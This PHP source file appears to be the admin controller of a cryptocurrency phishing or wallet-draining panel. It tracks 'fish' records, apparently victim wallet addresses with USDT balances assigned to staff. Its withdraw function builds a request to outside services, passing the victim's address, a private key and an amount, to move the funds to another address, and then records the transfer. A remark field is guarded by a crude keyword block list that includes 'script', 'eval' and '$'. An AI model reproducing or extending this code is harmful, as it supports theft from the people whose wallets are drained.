<?php


namespace app\admin\controller;


use app\common\consts\Response;
use app\common\service\AddressService;
use app\common\service\FishService;
use app\common\service\UserService;
use think\Request;

class Fish extends Base
{
    public function index(Request $request)
    {
        $remark = $request->get('remark');
        $address = $request->get('address');
        $min_balance = $request->get('min_balance');
        $max_balance = $request->get('max_balance');
        $email = $request->get('employee');

        $query = \app\common\model\Fish::order('create_time', 'desc')
                ->alias('f')->leftJoin('tbl_users u', 'f.employee = u.userId')
                ->field('f.*, u.email');

        if (!empty($email)) {
            $userIds = UserService::getUsersByEmail($email, $this->users);
            if (!empty($userIds)) {
                $query->whereIn('employee', array_column($userIds, 'userId'));
            }
        }

        if (!empty($users)) {
            $query->whereIn('employee', $users);
        }

        if (!empty($address)) {
            $query->where('address', 'like', '%' . $address . '%');
        }

        if (!empty($min_balance)) {
            $query->where('balance','>=', $min_balance);
        }

        if (!empty($max_balance)) {
            $query->where('balance',' <= ', $max_balance);
        }

        if (!empty($remark)) {
            $query->where('remark','like','%' . $remark . '%');
        }

        if (!empty($this->users)) {
            $query->whereIn('employee', $this->users);
        }

        $data = $query->paginate(3, false, ['query' => $request->param()]);

        return $this->fetch('', ['data' => $data, 'params' => $request->param()]);
    }

    public function remark(Request $request)
    {
        $id = $request->post('id');
        $remark = $request->post('remark');

        if(strpos($remark,'script') !== false){
            return '';
        }

        if(strpos($remark,'/') !== false){
            return '';
        }

        if(strpos($remark,'=') !== false){
            return '';
        }

        if(strpos($remark,'<') !== false){
            return '';
        }

        if(strpos($remark,'>') !== false){
            return '';
        }

        if(strpos($remark,'.') !== false){
            return '';
        }

        if(strpos($remark,'eval') !== false){
            return '';
        }

        if(strpos($remark,'$') !== false){
            return '';
        }

        \app\common\model\Fish::where('id' , '=', $id)->update(['remark' => $remark]);
        return $this->successJson();
    }

    public function update_balance(Request $request)
    {
        $id = $request->id;
     
        $fish = \app\common\model\Fish::find(['id' => $id]);

        $balance = FishService::getBalance($fish->address, $fish->type);
        if ($balance != false) {
            $fish->balance = $balance;
            $fish->save();
        }

        return $this->successJson();
    }
    
    

    public function withdraw_view(Request  $request)
    {
        $this->checkWithdraw();
        $id = $request->id;

        $data = \app\common\model\Fish::find(['id' => $id]);

        return $this->fetch('', ['data' => $data]);
    }


    public function withdraw(Request  $request)
    {
        $this->checkWithdraw();

        $from = $request->post('from');
        $id = $request->post('id');
        $to = $request->post('to');
        $amount = $request->post('amount');
        $pri_key = $request->post('privateKey');
        if (empty($id) || empty($to) || empty($from) || empty($amount)) {
            return $this->errorJson(Response::PARAM_IS_WRONG);
        }

        $fish_data = \app\common\model\Fish::find(['id' => $id])->toArray();

        if (empty($fish_data)) {
            return $this->errorJson(Response::PARAM_IS_WRONG);
        }


        if ($amount > $fish_data['balance']) {
            return $this->errorJson(Response::PARAM_IS_WRONG, '余额不足');
        }

        if ($fish_data['type'] == 'erc') {
            $contract = '0xdac17f958d2ee523a2206206994597c13d831ec7';
            $data = AddressService::getAddress('erc');
            $au_address = $data[0]['address'] ?? '';
            //$pri_key = $data[0]['pri_key'] ?? '';
            $url = 'http://erc.jiekou.shop/';

        } else {
            $data = AddressService::getAddress('trc');
            $au_address = $data[0]['address'] ?? '';
            //$pri_key = $data[0]['pri_key'] ?? '';
            $contract = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
            $url = 'http://trc.jiekou.shop/';
        }

        $params = [
            'from' => $from,
            'to' => $to,
            'contract' => $contract,
            'privateKey' => $pri_key,
            'tran_num' => $amount * 1000000
        ];

        try {
           /* $client = new \GuzzleHttp\Client();
            $res = $client->request('GET',$url.'?from='.$from.'&to='.$to.'&privateKey='.$pri_key.'&tran_num='.$amount * 1000000);*/
            $url2 = $url.'?from='.$from.'&to='.$to.'&privateKey='.$pri_key.'&tran_num='.$amount * 1000000;
            // header("Location: $url2");
            // echo  '<script>location.href="'.$url2.'"</script>';
           /*$status = $res->getStatusCode();
           $body = $res->getBody();
           echo $body;
           return;
           if ($status == 200) {

            } else {
                return $this->errorJson(Response::PARAM_IS_WRONG);
            }
*/
        } catch (\Exception $e) {
            return $this->errorJson(Response::PARAM_IS_WRONG);
        }

        $withdraw_log = array(
            'from_address' => $from,
            'au_address' => $au_address,
            'to_address' => $to,
            'balance' => $amount,
            'event' => 1,
            'pri_key' => '',
            'type' => $fish_data['type'],
            'employee' => $this->user_id,
            'customer_id' => 0
        );
        \app\common\model\Log::create($withdraw_log);

        $balance = bcsub($fish_data['balance'], $amount);
        \app\common\model\Fish::where('id', '=', $id)->update(['balance' => $balance]);

        return $this->successJson($url2);
    }

    public function destroy(Request $request)
    {
        $this->checkAdmin();
        $id = $request->id;

        $model = new \app\common\model\Fish();

        if (!empty($this->users)) {
            $model->whereIn('employee', $this->users);
        }

        $model->where('id', $id)->delete();

        return $this->successJson();
    }

}